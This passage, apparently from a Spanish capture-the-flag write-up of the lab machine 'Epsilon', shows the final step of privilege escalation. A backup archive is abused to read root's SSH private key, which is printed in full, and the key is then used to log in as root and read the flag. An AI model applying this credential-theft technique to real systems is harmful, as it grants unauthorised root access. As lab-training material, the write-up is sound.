```

Y listo

```bash
tom@epsilon:/tmp$ tar -xf 583638874.tar 
tom@epsilon:/tmp$ ls
583638874.tar
opt
systemd-private-03e64754b0a246a0bb9690e91e9cd911-apache2.service-qMsCci
systemd-private-03e64754b0a246a0bb9690e91e9cd911-systemd-logind.service-6U6EAf
systemd-private-03e64754b0a246a0bb9690e91e9cd911-systemd-resolved.service-4q9eWh
systemd-private-03e64754b0a246a0bb9690e91e9cd911-systemd-timesyncd.service-RU6nki
vmware-root_656-2689274927
zi.sh
tom@epsilon:/tmp$ cd opt/
tom@epsilon:/tmp/opt$ ls
backups
tom@epsilon:/tmp/opt$ cd backups/
tom@epsilon:/tmp/opt/backups$ 
```

Y ahora el **checksum** apunta ala **id_rsa** de **root** 

```bash
tom@epsilon:/tmp/opt/backups$ cat checksum 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
tom@epsilon:/tmp/opt/backups$ 
```

## Shell as root and root.txt

```bash
❯ ssh -i id_rsa root@10.10.11.134
The authenticity of host '10.10.11.134 (10.10.11.134)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.134' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 03 Jan 2024 09:28:11 PM UTC

  System load:                      0.02
  Usage of /:                       67.2% of 5.78GB
  Memory usage:                     17%
  Swap usage:                       0%
  Processes:                        239
  Users logged in:                  0
  IPv4 address for br-a2acb156d694: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.134
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:1787

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb  7 01:51:07 2022
root@epsilon:~# cat root.txt 
16c58927810d7e234a0019082c1c7321
root@epsilon:~# 
```

